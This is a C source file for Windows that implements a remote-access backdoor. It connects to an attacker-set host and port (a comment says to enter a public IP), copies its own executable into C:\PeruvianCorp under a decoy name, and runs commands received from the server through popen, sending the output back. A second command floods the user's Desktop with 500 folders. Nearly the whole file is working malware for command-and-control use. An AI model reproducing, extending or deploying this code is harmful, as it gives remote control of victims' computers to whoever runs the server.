#include <stdio.h>
#include <winsock.h>
#include <unistd.h>

#pragma comment(lib, "ws2_32.lib")

#define RECEIVE_BUFFER_SIZE 1024
#define MAX_FOLDER_LENGHT 260
#define MAX_FOLDER_LIMIT 500
#define PATH "C:\\PeruvianCorp"

// Establecer en HOST tu dirección de ip pública y el puerto previamente abierto. 
#define HOST "127.0.0.1"
#define PORT "8080"

char *strcpy(char *dest, const char *src)
{
    size_t i;
    for (i = 0; src[i] != '\0'; i++)
        dest[i] = src[i];
    dest[i] = '\0';
    return dest;
}

void error(char *message)
{
    fprintf(stderr, "%s: %d", message, WSAGetLastError());
    exit(1);
    return;
}

int create_exe_copy(char *filename)
{
    FILE *in = NULL, *out = NULL, *ts = NULL;
    char in_filename[100], out_filename[100];
    size_t n, m;
    strcpy(in_filename, filename);
    strcat(in_filename, ".exe");
    strcpy(out_filename, "C:\\PeruvianCorp\\flipresetdoubletapwithmusty.exe");
    unsigned char buffer[1024];
    if (in = fopen(in_filename, "rb"))
    {
        if (out = fopen(out_filename, "wb"))
        {
            do
            {
                n = fread(buffer, 1, sizeof buffer, in);
                if (n)
                    m = fwrite(buffer, 1, n, out);
                else
                    m = 0;
            } while ((n > 0) && (n == m));
            if (m)
                puts("Copied");
            fclose(out);
            fclose(in);
            if (ts = fopen("C:\\PeruvianCorp\\pestaniaste.txt", "a"))
            {
                fprintf(ts, "creo que pestañeaste");
                fclose(ts);
            }
            return 1;
        }
        else
            return 0;
    }
    else
        return 0;
}

int exists_copy(char *filename)
{
    FILE *f;
    if ((f = fopen(filename, "r")) != NULL)
    {
        fclose(f);
        return 0;
    }
    else
    {
        return 1;
    }
}

// char (*cwd)[PATH_MAX]
void handle_command(const char *command, char (*message)[RECEIVE_BUFFER_SIZE])
{
    if (strstr(command, "PONG"))
        return;
    else if (command[0] == 'c')
    {
        printf("Executing command: %s\n", command);
        FILE *dir = popen(command, "r");
        char buf[256];
        // char *(result)[RECEIVE_BUFFER_SIZE] = message;
        while (fgets(buf, sizeof(buf), dir) != 0)
        {
            strncat(*message, buf, RECEIVE_BUFFER_SIZE);
        }
        pclose(dir);
    }
    else if (command[0] == 'f')
    {
        printf("Creating %d folders..\n", MAX_FOLDER_LIMIT);
        char cmd[MAX_FOLDER_LENGHT], tmpcmd[MAX_FOLDER_LENGHT], tmp[4];
        strcpy(cmd, "mkdir ");
        strcat(cmd, getenv("USERPROFILE"));
        strcat(cmd, "\\Desktop\\forky");
        puts(cmd);
        for (int i = 0; i < MAX_FOLDER_LIMIT; i++)
        {
            strcpy(tmpcmd, cmd);
            sprintf(tmp, "%d", i);
            strcat(tmpcmd, tmp);
            system(tmpcmd);
        }
    }
}

int main(int argc, char *argv[])
{
    SOCKET so;
    WSADATA wsa;
    char *server_ip;
    char message[RECEIVE_BUFFER_SIZE];
    char buffer[RECEIVE_BUFFER_SIZE];
    char cwd[PATH_MAX];
    unsigned short server_port;
    int bytes_received;
    struct sockaddr_in server;

    if (getcwd(cwd, sizeof(cwd)) == NULL)
        error("Error on get dir..");

    server_ip = HOST;
    server_port = atoi(PORT);

    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
        error("Failed WSAStartup");

    printf("Winsock Initialised.\n");

    if ((so = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
        error("Error on created the socket");

    printf("Socket created.\n");

    memset(&server, 0, sizeof(server));
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(server_ip);
    server.sin_port = htons(server_port);

    if (connect(so, (struct sockaddr *)&server, sizeof server) < 0)
        error("Failed to connect");

    printf("Connected to %s:%d\n", server_ip, server_port);

    if (exists_copy("C:\\PeruvianCorp\\flipresetdoubletapwithmusty.exe") == 1)
    {
        puts("Creating a copy..");
        system("mkdir C:\\PeruvianCorp");
        if (create_exe_copy(argv[0]) == 0)
            error("Failed on copy");
    }
    else
        puts("Copy found!");

    strcpy(message, "PING");
    send(so, message, strlen(message) + 1, 0);
    while (strcmp(message, "QUIT") != 0)
    {
        if ((bytes_received = recv(so, buffer, RECEIVE_BUFFER_SIZE, 0)) == SOCKET_ERROR)
            error("Failed on receive");

        buffer[bytes_received] = '\0';
        handle_command(buffer, &message);
        printf("result: %s", message);
        send(so, message, strlen(message) + 1, 0);
        *message = '\0';
    }

    closesocket(so);
    WSACleanup();
    return 0;
}
